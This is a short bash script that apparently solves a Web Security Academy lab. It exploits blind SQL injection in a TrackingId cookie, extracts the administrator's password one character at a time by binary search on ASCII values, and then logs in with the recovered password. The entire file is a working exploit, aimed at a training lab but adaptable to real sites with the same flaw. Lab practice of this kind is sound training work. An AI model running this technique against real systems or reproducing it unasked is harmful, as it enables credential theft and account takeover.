#!/bin/bash

if [[ ${#1} -ne 32 ]]; then
	echo "USAGE: $0 subdomain"
	exit 1;
fi
url="https://$1.web-security-academy.net"
currentDir="$(dirname "$0")"
targetUser="administrator";

function check {
	res=$(curl -s -b "TrackingId=' OR (SELECT 'a' WHERE (SELECT COUNT(*)>0 FROM users WHERE username='$targetUser' AND $1))='a" "$url/filter?category=Gifts");
	lines=$(echo "$res" | wc -l);
	found=$(echo "$res" | grep 'Welcome' >/dev/null && echo true || echo false);
	echo "$res" | grep 'Welcome' > /dev/null
}

echo -n "Finding password length for $targetUser: "
passwordLen=8;
until check "LENGTH(password)=$passwordLen"; do
	passwordLen=$((passwordLen+1));
done
echo $passwordLen;

password="";
max=255;
min=0;
index=1;
ord=1;
echo -n "Stealing Password (This may take a while): ";
until [[ $index -gt $passwordLen ]]; do	
    max=255;
    min=0;
    ord=$((max + min));
    ord=$((ord / 2));
    until check "ASCII(SUBSTRING(password, $index, 1)) = $ord"; do
			ord=$((max + min));
			ord=$((ord / 2));
	    if check "ASCII(SUBSTRING(password, $index, 1)) > $ord"; then
		    min=$ord;
	    else
		    max=$ord;
	    fi;
    done;
		passwordChar=$(echo -ne "$(printf '\\x%x\n' $ord)");
		echo -n "$passwordChar";
		password="${password}${passwordChar}";
    ord=1;
    index=$((index+1));
done;
echo "$password";

$currentDir/../lib/login.sh "$url" "$targetUser" "$(echo -ne "$password")"